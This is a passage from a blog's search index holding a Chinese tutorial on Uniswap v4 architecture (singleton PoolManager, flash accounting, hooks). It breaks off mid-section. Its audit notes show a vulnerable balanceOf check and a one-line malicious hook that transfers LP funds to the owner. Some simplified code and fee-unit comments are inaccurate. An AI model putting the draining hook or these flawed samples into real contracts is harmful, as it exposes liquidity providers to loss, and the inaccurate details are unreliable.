<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Uniswap v4</title>
      <link href="/2025/12/15/Uniswap-v4/"/>
      <url>/2025/12/15/Uniswap-v4/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-v4"><a href="#Uniswap-v4" class="headerlink" title="Uniswap v4"></a>Uniswap v4</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><h3 id="0-1-DeFi-的三次范式跃迁"><a href="#0-1-DeFi-的三次范式跃迁" class="headerlink" title="0.1 DeFi 的三次范式跃迁"></a>0.1 DeFi 的三次范式跃迁</h3><p>在理解 Uniswap v4 之前，我们必须先理解 <strong>DeFi 到底经历了什么变化</strong>。DeFi（去中心化金融）从最初的简单借贷和交易，到如今的复杂金融基础设施，其演进反映了区块链技术的成熟和用户需求的增长。</p><table><thead><tr><th>阶段</th><th>代表</th><th>本质</th></tr></thead><tbody><tr><td>DeFi 1.0</td><td>Uniswap v1 &#x2F; MakerDAO</td><td><strong>单一金融产品</strong></td></tr><tr><td>DeFi 2.0</td><td>Uniswap v3 &#x2F; Aave v3</td><td><strong>高效但刚性的金融协议</strong></td></tr><tr><td><strong>DeFi 3.0</strong></td><td><strong>Uniswap v4</strong></td><td><strong>金融基础设施 &#x2F; 可编程内核</strong></td></tr></tbody></table><p>DeFi 1.0 时代，协议专注于解决特定问题，如 Uniswap v1 的代币交换或 MakerDAO 的稳定币借贷。这些产品虽然开创性，但功能单一，无法扩展到更复杂的金融场景。</p><p>DeFi 2.0 引入了效率提升，如 Uniswap v3 的集中流动性，允许 LP 在特定价格区间提供流动性，减少了资本浪费。然而，这些协议仍然高度刚性，所有逻辑都硬编码在合约中，难以适应市场变化或添加新功能。</p><p>现在，DeFi 3.0 以 Uniswap v4 为代表，标志着从“产品”向“基础设施”的转变。v4 不再是一个固定的 DEX，而是提供了一个可编程的内核，允许开发者通过 Hooks 自定义金融逻辑。这不仅提高了灵活性，还开启了无限的可能性，如动态费用、限价单、MEV 防护等。</p><p>V1&#x2F;V2&#x2F;V3 的 Uniswap，本质上都是：</p><blockquote><p><strong>“一个写死规则的交易所”</strong></p></blockquote><p>而 v4 的定位则完全不同：</p><blockquote><p><strong>“一个结算安全、行为外包的金融操作系统内核”</strong></p></blockquote><p>这种转变意味着开发者可以构建更丰富的 DeFi 应用，而无需从头开发 AMM 核心，从而加速创新并降低风险。</p><hr><h3 id="0-2-v4-的核心含义"><a href="#0-2-v4-的核心含义" class="headerlink" title="0.2 v4 的核心含义"></a>0.2 v4 的核心含义</h3><p><strong>v4 将 AMM 协议拆成了两层：</strong></p><ul><li><strong>不可变、安全、极端保守的 Core（PoolManager）</strong></li><li><strong>完全外包、可插拔、可被替换的 Strategy（Hooks）</strong></li></ul><p>这种架构设计深受操作系统内核启发。PoolManager 就像 Linux 内核，负责最核心的资源管理和安全保障，确保资产结算的正确性和原子性。它不关心具体的金融逻辑是什么，只保证交易的执行是安全的。</p><p>Hooks 则类似于内核模块或插件，允许外部开发者注入自定义逻辑。这些逻辑可以是动态费用调整、限价单执行、风险控制等。通过 Hooks，v4 实现了高度的可扩展性：同一个 PoolManager 可以支持无数种不同的金融产品，而无需修改核心代码。</p><p>这是一种非常 Web2 的思想：</p><ul><li>内核 ≈ Linux Kernel</li><li>Hook ≈ Kernel Module &#x2F; Plugin</li></ul><p>在 Web2 中，操作系统提供基础服务，应用通过 API 扩展功能。v4 将这一理念带入 DeFi，使得协议不再是封闭的，而是开放的生态系统。开发者可以专注于创新金融产品，而 Uniswap 提供底层保障。</p><hr><h3 id="0-3-为什么说-v4-不是-DEX，而是链上金融物理层"><a href="#0-3-为什么说-v4-不是-DEX，而是链上金融物理层" class="headerlink" title="0.3 为什么说 v4 不是 DEX，而是链上金融物理层"></a>0.3 为什么说 v4 不是 DEX，而是链上金融物理层</h3><p>用 v3 和 v4 做一个对比。</p><p>在 v3 时代：</p><ul><li>Uniswap 是 <strong>流动性提供者</strong></li><li>Router 是 <strong>交易入口</strong></li><li>LP 是 <strong>被动收益者</strong></li></ul><p>Uniswap v3 主要关注于提供高效的代币交换服务，通过集中流动性和动态费用来优化资本利用率。LP 通过提供流动性赚取手续费，但收益受制于无常损失和市场波动。</p><p>在 v4 时代：</p><ul><li>Uniswap 是 <strong>清算引擎</strong></li><li>Hook 是 <strong>金融逻辑执行者</strong></li><li>LP &#x2F; Trader 是 <strong>系统参与者</strong></li></ul><p>v4 的角色发生了根本转变。它不再局限于交换功能，而是成为一个通用的金融结算平台。PoolManager 负责所有资产的原子结算，确保交易的安全性和一致性。而具体的金融行为，如限价单、杠杆交易或衍生品，则通过 Hooks 实现。</p><p>换句话说：</p><blockquote><p><strong>v4 不关心你”做什么金融产品”，<br>它只关心：你的资产如何安全结算。</strong></p></blockquote><p>这种设计使得 v4 成为区块链上的“金融物理层”，类似于 TCP&#x2F;IP 协议栈中的网络层，提供基础传输服务，而上层应用可以无限扩展。开发者可以基于 v4 构建复杂的 DeFi 协议，如期权市场、杠杆农场或跨链桥，而无需担心底层结算的风险。</p><hr><h2 id="第一章：V3-的极限与不可修补性"><a href="#第一章：V3-的极限与不可修补性" class="headerlink" title="第一章：V3 的极限与不可修补性"></a>第一章：V3 的极限与不可修补性</h2><h3 id="1-1-V3-的设计成就（也是它的天花板）"><a href="#1-1-V3-的设计成就（也是它的天花板）" class="headerlink" title="1.1 V3 的设计成就（也是它的天花板）"></a>1.1 V3 的设计成就（也是它的天花板）</h3><p>Uniswap v3 的集中流动性是一次伟大的工程突破：</p><ul><li>Tick-based 定价</li><li>流动性区间</li><li>虚拟流动性</li></ul><p>v3 引入了 Tick 系统，将价格范围划分为离散的区间，LP 可以选择在特定区间提供流动性。这不仅提高了资本效率，还允许更精细的价格控制。虚拟流动性概念进一步优化了数学模型，使池子能够处理更大范围的价格变动。</p><p>但它有一个 <strong>致命前提</strong>：</p><blockquote><p><strong>所有行为都必须被硬编码进合约</strong></p></blockquote><p>这意味着任何新功能，如动态费用或限价单，都需要通过治理或分叉来实现，导致开发周期长、风险高。</p><p>这带来了几个无法修补的问题：</p><h4 id="❌-1-固定费用模型"><a href="#❌-1-固定费用模型" class="headerlink" title="❌ 1. 固定费用模型"></a>❌ 1. 固定费用模型</h4><ul><li>无法根据波动率、交易规模动态调整</li><li>LP 在高波动时被系统性剥削（IL）</li></ul><p>固定费用无法适应市场条件，高波动期手续费可能不足以补偿 LP 的无常损失。</p><h4 id="❌-2-行为不可扩展"><a href="#❌-2-行为不可扩展" class="headerlink" title="❌ 2. 行为不可扩展"></a>❌ 2. 行为不可扩展</h4><ul><li>限价单？</li><li>TWAMM？</li><li>波动率控制？</li></ul><p>👉 <strong>只能重新 fork 一套 Uniswap</strong></p><p>每次添加新功能都需要创建新合约，增加了碎片化和复杂性。</p><h4 id="❌-3-合约碎片化严重"><a href="#❌-3-合约碎片化严重" class="headerlink" title="❌ 3. 合约碎片化严重"></a>❌ 3. 合约碎片化严重</h4><p>每个池子都是一个合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ETH/USDC 0.05%  → Pool A</span><br><span class="line">ETH/USDC 0.3%   → Pool B</span><br><span class="line">ETH/DAI  0.3%   → Pool C</span><br></pre></td></tr></table></figure><p><strong>1000 个池 &#x3D; 1000 个合约</strong></p><p>这不仅增加了部署成本，还使得跨池操作复杂，Gas 费用高昂。</p><hr><h2 id="第二章：Singleton-——-从”楼房集市”到”中央水管系统”"><a href="#第二章：Singleton-——-从”楼房集市”到”中央水管系统”" class="headerlink" title="第二章：Singleton —— 从”楼房集市”到”中央水管系统”"></a>第二章：Singleton —— 从”楼房集市”到”中央水管系统”</h2><h3 id="2-1-架构本质：一个合约管理一切"><a href="#2-1-架构本质：一个合约管理一切" class="headerlink" title="2.1 架构本质：一个合约管理一切"></a>2.1 架构本质：一个合约管理一切</h3><p>Uniswap v4 的核心是一个合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PoolManager &#123; ... &#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>PoolManager</code> 是 v4 的核心合约，它使用 Singleton 模式，通过一个合约实例管理所有流动性池的状态，而不是像 v3 那样为每个池子部署单独合约。这大大降低了 Gas 成本，因为避免了多次外部调用。</p><p>以下是一个简化的 PoolManager swap 方法示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swap(PoolKey memory key, IPoolManager.SwapParams memory params) external returns (BalanceDelta delta) &#123;</span><br><span class="line">    // 验证权限</span><br><span class="line">    require(msg.sender == address(router) || msg.sender == address(hooks[key.hooks]));</span><br><span class="line">    </span><br><span class="line">    // 获取池子状态</span><br><span class="line">    PoolId id = key.toId();</span><br><span class="line">    PoolState storage pool = pools[id];</span><br><span class="line">    </span><br><span class="line">    // 执行 AMM 计算（简化）</span><br><span class="line">    uint256 amountOut = calculateSwap(pool, params);</span><br><span class="line">    </span><br><span class="line">    // 更新池子状态</span><br><span class="line">    pool.sqrtPriceX96 = newSqrtPrice;</span><br><span class="line">    pool.tick = newTick;</span><br><span class="line">    </span><br><span class="line">    // 记录债务变化</span><br><span class="line">    delta = BalanceDelta(&#123;amount0: int256(params.amountIn), amount1: -int256(amountOut)&#125;);</span><br><span class="line">    </span><br><span class="line">    // 调用 Hooks</span><br><span class="line">    if (address(key.hooks) != address(0)) &#123;</span><br><span class="line">        key.hooks.afterSwap(key, params, delta);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    return delta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个 <code>swap</code> 方法展示了 v4 的核心逻辑：验证调用者、计算交换量、更新状态、记录债务，并调用 Hooks。实际代码更复杂，包括 slippage 检查和事件发射。</p><p>所有池子都变成了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mapping(PoolId =&gt; PoolState)</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这里使用一个映射（mapping）来存储所有池子的状态，<code>PoolId</code> 是池子的唯一标识符，<code>PoolState</code> 包含池子的所有必要数据，如流动性、价格等。这种设计使得跨池操作更加高效。</p><p>Singleton 架构的核心优势在于集中管理。它允许 PoolManager 在一次交易中处理多个池子的操作，而无需外部调用。这不仅节省 Gas，还提高了交易的原子性：要么全部成功，要么全部回滚。</p><p>这就是 <strong>Singleton</strong>。</p><hr><h3 id="2-2-PoolId：池子的”DNA”"><a href="#2-2-PoolId：池子的”DNA”" class="headerlink" title="2.2 PoolId：池子的”DNA”"></a>2.2 PoolId：池子的”DNA”</h3><p>在 v4 中，一个池子的身份不是地址，而是一个 <strong>哈希</strong>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PoolId = keccak256(PoolKey)</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>PoolId</code> 通过对 <code>PoolKey</code> 进行 keccak256 哈希计算得到，确保每个池子有唯一的标识符。这使得池子可以动态创建，而不需要预先部署合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct PoolKey &#123;</span><br><span class="line">    Currency currency0;</span><br><span class="line">    Currency currency1;</span><br><span class="line">    uint24 fee;</span><br><span class="line">    int24 tickSpacing;</span><br><span class="line">    IHooks hooks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>PoolKey</code> 结构体定义了池子的关键参数，包括两个代币（currency0 和 currency1）、手续费（fee）、tick 间距（tickSpacing）和 Hooks 合约地址。Hooks 地址作为参数的一部分，使得不同 Hooks 的池子被视为不同池子。</p><p>📌 <strong>关键点</strong>：</p><blockquote><p><strong>Hooks 地址是 PoolKey 的一部分</strong></p></blockquote><p>这意味着：</p><ul><li>ETH&#x2F;USDC + 动态费率 Hook ≠ ETH&#x2F;USDC + 限价单 Hook</li><li>它们是 <strong>两个完全不同的池子</strong></li></ul><hr><h3 id="2-3-为什么-Singleton-会极大降低-Gas"><a href="#2-3-为什么-Singleton-会极大降低-Gas" class="headerlink" title="2.3 为什么 Singleton 会极大降低 Gas"></a>2.3 为什么 Singleton 会极大降低 Gas</h3><h4 id="v3-跨池-swap："><a href="#v3-跨池-swap：" class="headerlink" title="v3 跨池 swap："></a>v3 跨池 swap：</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Router → Pool A (external call)</span><br><span class="line">       → Pool B (external call)</span><br><span class="line">       → Pool C (external call)</span><br></pre></td></tr></table></figure><h4 id="v4-跨池-swap："><a href="#v4-跨池-swap：" class="headerlink" title="v4 跨池 swap："></a>v4 跨池 swap：</h4><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Router → PoolManager</span><br><span class="line">          ├─ swap(poolA)</span><br><span class="line">          ├─ swap(poolB)</span><br><span class="line">          └─ swap(poolC)</span><br></pre></td></tr></table></figure><p>📉 <strong>省掉了：</strong></p><ul><li>外部调用成本</li><li>Context 切换</li><li>Calldata 重复解析</li></ul><hr><h3 id="2-4-EIP-1153：Transient-Storage-是-v4-的”黑科技核心”"><a href="#2-4-EIP-1153：Transient-Storage-是-v4-的”黑科技核心”" class="headerlink" title="2.4 EIP-1153：Transient Storage 是 v4 的”黑科技核心”"></a>2.4 EIP-1153：Transient Storage 是 v4 的”黑科技核心”</h3><h4 id="什么是-Transient-Storage？"><a href="#什么是-Transient-Storage？" class="headerlink" title="什么是 Transient Storage？"></a>什么是 Transient Storage？</h4><ul><li><p>类似 <code>storage</code></p></li><li><p>但：</p><ul><li>只在当前 tx 存在</li><li>不写入状态树</li><li>tx 结束即清空</li></ul></li></ul><p>Gas 对比：</p><table><thead><tr><th>操作</th><th>Gas</th></tr></thead><tbody><tr><td>SSTORE</td><td>~20,000</td></tr><tr><td>TSTORE</td><td>~100</td></tr></tbody></table><hr><h4 id="v4-用它干了什么？"><a href="#v4-用它干了什么？" class="headerlink" title="v4 用它干了什么？"></a>v4 用它干了什么？</h4><ul><li>swap 中的临时余额</li><li>Flash Accounting 的欠账</li><li>Hook 间状态传递</li></ul><p>👉 <strong>否则 Singleton 根本跑不动</strong></p><p>以下是使用 Transient Storage 的示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 使用 EIP-1153 Transient Storage</span><br><span class="line">bytes32 constant DELTA_SLOT = keccak256(&quot;delta&quot;);</span><br><span class="line"></span><br><span class="line">function recordDelta(address user, address token, int256 amount) internal &#123;</span><br><span class="line">    bytes32 slot = keccak256(abi.encode(user, token, DELTA_SLOT));</span><br><span class="line">    int256 current = int256(tload(slot));</span><br><span class="line">    tstore(slot, bytes32(uint256(current + amount)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function getDelta(address user, address token) internal view returns (int256) &#123;</span><br><span class="line">    bytes32 slot = keccak256(abi.encode(user, token, DELTA_SLOT));</span><br><span class="line">    return int256(tload(slot));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>tstore</code> 和 <code>tload</code> 是 Transient Storage 的操作函数，用于记录和读取临时债务。数据只在当前交易中存在，结束后自动清空，避免了状态树的写入开销。</p><hr><h2 id="第三章：Flash-Accounting-——-延迟支付的结算革命"><a href="#第三章：Flash-Accounting-——-延迟支付的结算革命" class="headerlink" title="第三章：Flash Accounting —— 延迟支付的结算革命"></a>第三章：Flash Accounting —— 延迟支付的结算革命</h2><h3 id="3-1-传统-AMM-的致命低效"><a href="#3-1-传统-AMM-的致命低效" class="headerlink" title="3.1 传统 AMM 的致命低效"></a>3.1 传统 AMM 的致命低效</h3><p>在 v3：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tokenIn.transferFrom(user, pool, amount);</span><br><span class="line">tokenOut.transfer(user, amountOut);</span><br></pre></td></tr></table></figure><p>每一步都是：</p><ul><li>ERC20 call</li><li>balance update</li><li>allowance check</li></ul><p>传统 AMM 在每次交易中都需要立即执行代币转账。这涉及到多次外部调用 ERC20 合约，检查余额和授权，导致高 Gas 成本和潜在的重入风险。此外，多次转账还可能引入不一致性，如果某一步失败，整个交易可能部分执行。</p><hr><h3 id="3-2-v4-的思路：先记账，后结算"><a href="#3-2-v4-的思路：先记账，后结算" class="headerlink" title="3.2 v4 的思路：先记账，后结算"></a>3.2 v4 的思路：先记账，后结算</h3><p>v4 在 swap 过程中：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">User 欠 Pool +100 USDC</span><br><span class="line">Pool 欠 User -0.05 ETH</span><br></pre></td></tr></table></figure><p>只记录在 <strong>Transient Storage</strong> 中。</p><p>v4 采用延迟结算策略：在交易执行期间，不立即转账代币，而是记录净债务变化。这利用了 Transient Storage，只在当前交易中有效，避免了状态树的写入。用户和池子之间的债务用正负数表示，确保最终净额正确。</p><hr><h3 id="3-3-统一结算点（Settlement-Phase）"><a href="#3-3-统一结算点（Settlement-Phase）" class="headerlink" title="3.3 统一结算点（Settlement Phase）"></a>3.3 统一结算点（Settlement Phase）</h3><p>在交易结束前：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">净额：</span><br><span class="line">User → Pool : 100 USDC</span><br><span class="line">Pool → User : 0.05 ETH</span><br></pre></td></tr></table></figure><p><strong>只发生一次真实转账</strong></p><p>以下是简化的结算逻辑代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function settle() external &#123;</span><br><span class="line">    // 计算净债务</span><br><span class="line">    int256 netToken0 = deltas[msg.sender][address(token0)];</span><br><span class="line">    int256 netToken1 = deltas[msg.sender][address(token1)];</span><br><span class="line">    </span><br><span class="line">    // 执行转账</span><br><span class="line">    if (netToken0 &gt; 0) &#123;</span><br><span class="line">        token0.transferFrom(msg.sender, address(this), uint256(netToken0));</span><br><span class="line">    &#125; else if (netToken0 &lt; 0) &#123;</span><br><span class="line">        token0.transfer(msg.sender, uint256(-netToken0));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if (netToken1 &gt; 0) &#123;</span><br><span class="line">        token1.transferFrom(msg.sender, address(this), uint256(netToken1));</span><br><span class="line">    &#125; else if (netToken1 &lt; 0) &#123;</span><br><span class="line">        token1.transfer(msg.sender, uint256(-netToken1));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 清空债务记录</span><br><span class="line">    delete deltas[msg.sender][address(token0)];</span><br><span class="line">    delete deltas[msg.sender][address(token1)];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>settle</code> 函数在交易结束后执行，计算并结算净债务。正数表示用户欠池子，负数表示池子欠用户。只执行必要的转账，然后清空 Transient Storage 中的记录。</p><p>所有操作完成后，PoolManager 计算净债务，并执行最终的代币转账。这减少了外部调用次数，提高了效率，并确保了原子性：如果结算失败，整个交易回滚。</p><hr><h3 id="3-4-Flash-Accounting-原生-Flash-Loan"><a href="#3-4-Flash-Accounting-原生-Flash-Loan" class="headerlink" title="3.4 Flash Accounting &#x3D; 原生 Flash Loan"></a>3.4 Flash Accounting &#x3D; 原生 Flash Loan</h3><p>如果某账户在交易中出现：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">-1000 USDC</span><br></pre></td></tr></table></figure><p>只要在 settlement 前补回即可。</p><p>📌 <strong>不需要单独的 FlashLoan 合约</strong></p><hr><h3 id="3-5-审计视角：Flash-Accounting-的危险边界"><a href="#3-5-审计视角：Flash-Accounting-的危险边界" class="headerlink" title="3.5 审计视角：Flash Accounting 的危险边界"></a>3.5 审计视角：Flash Accounting 的危险边界</h3><p>⚠️ <strong>关键安全原则</strong>：</p><blockquote><p>在 Hook 中，<br><strong>任何依赖 ERC20.balanceOf 的逻辑都是错误的</strong></p></blockquote><p>原因：</p><ul><li>余额尚未结算</li><li>只是”账面幻象”</li></ul><h4 id="典型漏洞模式"><a href="#典型漏洞模式" class="headerlink" title="典型漏洞模式"></a>典型漏洞模式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint balance = token.balanceOf(address(this));</span><br><span class="line">require(balance &gt;= x); // ❌ 永远不可信</span><br></pre></td></tr></table></figure><hr><h2 id="第四章：Hooks-的本质-——“被允许插队的外部代码”"><a href="#第四章：Hooks-的本质-——“被允许插队的外部代码”" class="headerlink" title="第四章：Hooks 的本质 ——“被允许插队的外部代码”"></a>第四章：Hooks 的本质 ——“被允许插队的外部代码”</h2><h3 id="4-1-Hooks-不是插件，而是同步执行的一部分"><a href="#4-1-Hooks-不是插件，而是同步执行的一部分" class="headerlink" title="4.1 Hooks 不是插件，而是同步执行的一部分"></a>4.1 Hooks 不是插件，而是同步执行的一部分</h3><p>很多人第一次听 Hooks，会以为它类似：</p><blockquote><p>“交易完成后调用一个 callback”</p></blockquote><p>这是<strong>完全错误的理解</strong>。</p><p>在 Uniswap v4 中：</p><blockquote><p><strong>Hooks 是 PoolManager 交易流程的同步组成部分</strong></p></blockquote><p>也就是说：</p><ul><li>Hook <strong>不是异步</strong></li><li>Hook <strong>不能失败</strong></li><li>Hook <strong>一旦 revert，整个 swap revert</strong></li></ul><p>👉 从语义上看，Hook 和核心 AMM 逻辑 <strong>处于同一原子事务中</strong>。</p><p>Hooks 的同步特性意味着它们与 AMM 计算紧密集成，不能独立失败。这确保了交易的完整性，但也要求 Hook 开发者小心处理错误：任何 revert 都会终止整个操作。此外，Hooks 运行在未结算状态下，必须避免依赖实时余额，以防逻辑错误。</p><hr><h3 id="4-2-Hooks-的真实执行位置（这个非常重要）"><a href="#4-2-Hooks-的真实执行位置（这个非常重要）" class="headerlink" title="4.2 Hooks 的真实执行位置（这个非常重要）"></a>4.2 Hooks 的真实执行位置（这个非常重要）</h3><p>一个 v4 swap 的真实顺序是：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Router</span><br><span class="line">  └─ PoolManager.swap()</span><br><span class="line">        ├─ beforeSwap()   ← Hook</span><br><span class="line">        ├─ AMM 核心计算</span><br><span class="line">        ├─ afterSwap()    ← Hook</span><br><span class="line">        └─ Flash Accounting Settlement</span><br></pre></td></tr></table></figure><p>📌 <strong>关键事实</strong>：</p><blockquote><p>Hook 运行时：</p><ul><li>资产尚未真实转移</li><li>balanceOf 全是幻觉</li><li>所有”钱”都只是记账</li></ul></blockquote><hr><h2 id="第五章：8-个-Hooks-的精确定义"><a href="#第五章：8-个-Hooks-的精确定义" class="headerlink" title="第五章：8 个 Hooks 的精确定义"></a>第五章：8 个 Hooks 的精确定义</h2><h3 id="5-1-Hook-接口总览"><a href="#5-1-Hook-接口总览" class="headerlink" title="5.1 Hook 接口总览"></a>5.1 Hook 接口总览</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interface IHooks &#123;</span><br><span class="line">    function beforeInitialize(...) external returns (bytes4);</span><br><span class="line">    function afterInitialize(...) external returns (bytes4);</span><br><span class="line"></span><br><span class="line">    function beforeAddLiquidity(...) external returns (bytes4);</span><br><span class="line">    function afterAddLiquidity(...) external returns (bytes4);</span><br><span class="line"></span><br><span class="line">    function beforeRemoveLiquidity(...) external returns (bytes4);</span><br><span class="line">    function afterRemoveLiquidity(...) external returns (bytes4);</span><br><span class="line"></span><br><span class="line">    function beforeSwap(...) external returns (bytes4);</span><br><span class="line">    function afterSwap(...) external returns (bytes4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：<code>IHooks</code> 接口定义了 8 个 Hook 函数，每个函数在池子生命周期的不同阶段被调用。<code>before*</code> 函数在操作前执行，可以修改参数或拒绝操作；<code>after*</code> 函数在操作后执行，用于后续处理。返回值 <code>bytes4</code> 是函数选择器，用于验证实现。</p><p>以下是一个简单的 Hook 实现示例，实现动态费用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract DynamicFeeHook is IHooks &#123;</span><br><span class="line">    uint24 public dynamicFee;</span><br><span class="line">    </span><br><span class="line">    function beforeSwap(PoolKey calldata key, IPoolManager.SwapParams calldata params) external returns (bytes4) &#123;</span><br><span class="line">        // 根据波动率调整费用</span><br><span class="line">        uint256 volatility = getVolatility(key);</span><br><span class="line">        if (volatility &gt; 100) &#123;</span><br><span class="line">            dynamicFee = 5000; // 5%</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            dynamicFee = 300; // 0.3%</span><br><span class="line">        &#125;</span><br><span class="line">        return IHooks.beforeSwap.selector;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function afterSwap(PoolKey calldata key, IPoolManager.SwapParams calldata params, BalanceDelta delta) external returns (bytes4) &#123;</span><br><span class="line">        // 记录统计数据</span><br><span class="line">        emit SwapExecuted(key.toId(), params.amountIn, uint256(-delta.amount1));</span><br><span class="line">        return IHooks.afterSwap.selector;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 其他 Hook 函数实现为默认</span><br><span class="line">    function beforeInitialize(...) external pure returns (bytes4) &#123; return IHooks.beforeInitialize.selector; &#125;</span><br><span class="line">    // ... 省略其他</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个 Hook 在 <code>beforeSwap</code> 中根据波动率动态调整手续费，在 <code>afterSwap</code> 中发射事件记录交易。其他 Hook 函数返回默认选择器，表示不执行额外逻辑。</p><hr><h3 id="5-2-beforeInitialize-afterInitialize"><a href="#5-2-beforeInitialize-afterInitialize" class="headerlink" title="5.2 beforeInitialize &#x2F; afterInitialize"></a>5.2 beforeInitialize &#x2F; afterInitialize</h3><p><strong>池子出生那一刻能干什么？</strong></p><h4 id="beforeInitialize"><a href="#beforeInitialize" class="headerlink" title="beforeInitialize"></a>beforeInitialize</h4><p><strong>调用时机：</strong></p><ul><li>PoolKey 已确定</li><li>PoolState 尚未写入</li></ul><p><strong>适合做的事：</strong></p><ul><li>参数白名单检查</li><li>禁止某些 token 组合</li><li>Hook 自身初始化校验</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(token0 != token1);</span><br><span class="line">require(allowed[msg.sender]);</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：在 <code>beforeInitialize</code> 中，可以使用 <code>require</code> 语句检查条件。例如，确保两个代币不同（避免无效池子），或检查调用者是否在允许列表中。这可以防止恶意或无效的池子创建。</p><p><strong>参数：</strong> <code>PoolKey calldata key</code> - 包含池子的所有配置信息。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.beforeInitialize.selector</code>。</p><p><strong>安全注意：</strong> 不能修改 PoolKey 或写入任何状态，只能进行校验。如果校验失败，整个初始化 revert。</p><hr><h4 id="afterInitialize"><a href="#afterInitialize" class="headerlink" title="afterInitialize"></a>afterInitialize</h4><p><strong>调用时机：</strong></p><ul><li>PoolState 已创建</li><li>Tick &#x3D; initial tick</li></ul><p><strong>典型用途：</strong></p><ul><li>初始化外部仓位</li><li>设置策略状态</li></ul><p>⚠️ <strong>审计点</strong>：</p><ul><li>是否偷偷铸币</li><li>是否外部转账</li></ul><p><strong>代码说明</strong>：<code>afterInitialize</code> 在池子状态创建后调用，可以执行初始化逻辑，如设置外部合约的状态或铸造初始代币。</p><p><strong>参数：</strong> <code>PoolKey calldata key</code> - 池子配置。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.afterInitialize.selector</code>。</p><p><strong>安全注意：</strong> 可以执行外部调用，但需小心重入。审计时检查是否滥用权限，如铸造代币给攻击者。</p><hr><h3 id="5-3-beforeAddLiquidity-afterAddLiquidity"><a href="#5-3-beforeAddLiquidity-afterAddLiquidity" class="headerlink" title="5.3 beforeAddLiquidity &#x2F; afterAddLiquidity"></a>5.3 beforeAddLiquidity &#x2F; afterAddLiquidity</h3><p><strong>LP 的”入场安检”</strong></p><hr><h4 id="beforeAddLiquidity"><a href="#beforeAddLiquidity" class="headerlink" title="beforeAddLiquidity"></a>beforeAddLiquidity</h4><p><strong>非常危险的 Hook 点</strong></p><p>可以：</p><ul><li>拒绝 LP（KYC &#x2F; NFT Gate）</li><li>设置 LP 锁仓条件</li><li>动态调整可存入范围</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(block.timestamp &gt;= unlockTime[msg.sender]);</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：这个 Hook 可以根据条件拒绝流动性添加。例如，检查用户是否持有特定 NFT，或时间锁仓到期。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params</code> - 池子配置和流动性参数。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.beforeAddLiquidity.selector</code>。</p><p><strong>安全注意：</strong> 过度限制可能导致 LP 无法退出。恶意 Hook 可永久锁仓资金。</p><p>🚨 <strong>攻击面</strong>：</p><ul><li>恶意 Hook 永久阻止 LP 取钱</li><li>Hook 利用 revert 实现软 Rug</li></ul><hr><h4 id="afterAddLiquidity"><a href="#afterAddLiquidity" class="headerlink" title="afterAddLiquidity"></a>afterAddLiquidity</h4><p><strong>最常见的”吸血 Hook”发生地</strong></p><p>可以：</p><ul><li>把 LP 的流动性转去 ERC-4626</li><li>铸奖励代币</li><li>建立二次衍生仓位</li></ul><p>❌ <strong>但也可以：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">token.transfer(owner, amount); // 合法但恶意</span><br></pre></td></tr></table></figure><p><strong>代码说明</strong>：在流动性添加后，可以执行奖励逻辑，如铸造治理代币或存入收益农场。</p><p><strong>参数：</strong> <code>PoolKey calldata key, IPoolManager.ModifyLiquidityParams calldata params, BalanceDelta delta</code> - 包括流动性变化。</p><p><strong>返回值：</strong> <code>bytes4</code> - 必须是 <code>IHooks.afterAddLiquidity.selector</code>。</p><p><strong>安全注意：</strong> 检查是否转移 LP 